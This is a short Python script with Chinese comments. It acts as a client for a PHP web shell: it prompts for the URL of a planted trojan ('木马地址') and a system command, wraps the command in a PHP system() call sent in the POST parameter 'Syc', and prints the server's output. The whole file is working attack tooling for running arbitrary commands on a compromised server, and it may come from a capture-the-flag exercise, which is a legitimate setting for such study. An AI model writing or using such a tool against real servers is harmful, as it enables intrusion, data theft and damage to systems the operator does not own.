import requests

# 输入木马地址
url = input("请输入木马地址: ")

# 输入系统命令
cmd = input("请输入系统命令: ")

# 自动拼接成 PHP 代码
data = {
    "Syc": f'system("{cmd}");'
}

# 发送 POST 请求
res = requests.post(url, data=data)

# 输出结果
print(res.text)